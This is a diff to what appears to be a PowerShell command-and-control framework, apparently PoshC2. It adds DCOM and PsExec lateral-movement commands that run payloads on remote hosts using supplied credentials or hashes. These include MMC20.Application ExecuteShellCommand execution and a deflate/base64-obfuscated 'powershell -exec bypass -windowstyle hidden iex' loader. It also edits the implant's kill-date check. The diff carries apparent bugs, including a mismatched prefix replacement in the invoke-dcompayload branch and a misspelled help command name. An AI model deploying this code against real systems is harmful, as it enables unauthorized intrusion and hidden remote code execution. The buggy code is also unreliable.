@@ -531,12 +531,14 @@ $header = '
         Write-Host " Invoke-Runas -User SomeAccount -Password SomePass -Domain SomeDomain -Binary C:\Windows\System32\cmd.exe -Args <optional> -LogonType 0x2" -ForegroundColor Green        
         write-host " Invoke-DCOMPayload -Target <ip>" -ForegroundColor Green
         write-host " Invoke-DCOMProxyPayload -Target <ip>" -ForegroundColor Green
-        write-host " Invoke-WMIExec -Target <ip> -Domain <dom> -Username <user> -Password '<pass>' -Hash <hash-optional> -command <cmd>" -ForegroundColor Green
-        write-host " Invoke-WMIPayload -Target <ip> -Domain <dom> -Username <user> -Password '<pass>' -Hash <hash-optional>" -ForegroundColor Green
+        write-host " Invoke-DCOMDaisyPayload -Target <ip>" -ForegroundColor Green
         write-host " Invoke-PsExecPayload -Target <ip> -Domain <dom> -User <user> -pass '<pass>' -Hash <hash-optional>" -ForegroundColor Green
         write-host " Invoke-PsExecProxyPayload -Target <ip> -Domain <dom> -User <user> -pass '<pass>' -Hash <hash-optional>" -ForegroundColor Green
+        write-host " Invoke-PsExecDiasyPayload -Target <ip> -Domain <dom> -User <user> -pass '<pass>' -Hash <hash-optional>" -ForegroundColor Green
+        write-host " Invoke-WMIPayload -Target <ip> -Domain <dom> -Username <user> -Password '<pass>' -Hash <hash-optional>" -ForegroundColor Green
         write-host " Invoke-WMIProxyPayload -Target <ip> -Domain <dom> -User <user> -pass '<pass>' -Hash <hash-optional>" -ForegroundColor Green
         write-host " Invoke-WMIDaisyPayload -Target <ip> -Domain <dom> -user <user> -pass '<pass>'" -ForegroundColor Green
+        write-host " Invoke-WMIExec -Target <ip> -Domain <dom> -Username <user> -Password '<pass>' -Hash <hash-optional> -command <cmd>" -ForegroundColor Green
         #write-host " EnableWinRM | DisableWinRM -computer <dns/ip> -user <dom\user> -pass <pass>" -ForegroundColor Green
         write-host " Invoke-WinRMSession -IPAddress <ip> -user <dom\user> -pass <pass>" -ForegroundColor Green
         write-host `n "Credentials / Tokens / Local Hashes (Must be SYSTEM): " -ForegroundColor Green
@@ -722,7 +724,7 @@ $fdsf = @"
 function Get-Webclient (`$Cookie) {
 `$d = (Get-Date -Format "dd/MM/yyyy");
 `$d = [datetime]::ParseExact(`$d,"dd/MM/yyyy",`$null);
-`$k = [datetime]::ParseExact("'+$killdatefm+'","dd/MM/yyyy",`$null);
+`$k = [datetime]::ParseExact("$killdatefm","dd/MM/yyyy",`$null);
 if (`$k -lt `$d) {exit} 
 `$username = `$username
 `$password = `$password
@@ -1155,10 +1157,21 @@ param
                     $pscommand = $null
                 }
             }
+            if ($pscommand.ToLower().StartsWith('invoke-dcomdaisypayload'))
+            {
+                if (Test-Path "$FolderPath\payloads\daisypayload.bat"){ 
+                    $proxypayload = Get-Content -Path "$FolderPath\payloads\daisypayload.bat"
+                    $target = $pscommand -replace 'invoke-dcomdaisypayload -target ', ''
+                    $pscommand = "`$c = [activator]::CreateInstance([type]::GetTypeFromProgID(`"MMC20.Application`",`"$target`")); `$c.Document.ActiveView.ExecuteShellCommand(`"C:\Windows\System32\cmd.exe`",`$null,`"/c $proxypayload`",`"7`")"
+                } else {
+                    write-host "Need to run Invoke-DaisyChain first"
+                    $pscommand = $null
+                }
+            }
             if ($pscommand.ToLower().StartsWith('invoke-dcompayload'))
             {
                    $payload = Get-Content -Path "$FolderPath\payloads\payload.bat"
-                   $target = $pscommand -replace 'invoke-dcomproxypayload -target ', ''
+                   $target = $pscommand -replace 'invoke-dcomdaisypayload -target ', ''
                    $pscommand = "`$c = [activator]::CreateInstance([type]::GetTypeFromProgID(`"MMC20.Application`",`"$target`")); `$c.Document.ActiveView.ExecuteShellCommand(`"C:\Windows\System32\cmd.exe`",`$null,`"/c $payload`",`"7`")"
             }
             if ($pscommand.ToLower().StartsWith('invoke-wmidaisypayload'))
@@ -1205,6 +1218,29 @@ param
                     $pscommand = $pscommand + " -command `"powershell -exec bypass -Noninteractive -windowstyle hidden -c $NewPayload`""
                 } else {
                     write-host "Need to run CreateProxyPayload first"
+                    $pscommand = $null
+                }
+            }
+            if ($pscommand.ToLower().StartsWith('invoke-psexecdaisypayload'))
+            {
+                if (Test-Path "$FolderPath\payloads\daisypayload.bat"){ 
+                    CheckModuleLoaded "Invoke-PsExec.ps1" $psrandomuri
+                    $proxypayload = Get-Content -Path "$FolderPath\payloads\daisypayload.bat"
+                    $pscommand = $pscommand -replace 'Invoke-PsExecDaisyPayload', 'Invoke-PsExec'
+                    $proxypayload = $proxypayload -replace "powershell -exec bypass -Noninteractive -windowstyle hidden -e ", ""
+                    $rawpayload = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($proxypayload))
+                    $ScriptBytes = ([Text.Encoding]::ASCII).GetBytes($rawpayload)
+                    $CompressedStream = New-Object IO.MemoryStream
+                    $DeflateStream = New-Object IO.Compression.DeflateStream ($CompressedStream, [IO.Compression.CompressionMode]::Compress)
+                    $DeflateStream.Write($ScriptBytes, 0, $ScriptBytes.Length)
+                    $DeflateStream.Dispose()
+                    $CompressedScriptBytes = $CompressedStream.ToArray()
+                    $CompressedStream.Dispose()
+                    $EncodedCompressedScript = [Convert]::ToBase64String($CompressedScriptBytes)
+                    $NewPayload = 'iex(New-Object IO.StreamReader((New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String(' + "'$EncodedCompressedScript'" + '),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()'
+                    $pscommand = $pscommand + " -command `"powershell -exec bypass -Noninteractive -windowstyle hidden -c $NewPayload`""
+                } else {
+                    write-host "Need to run Invoke-DaisyChain first"
                     $pscommand = $null
                 }
             }
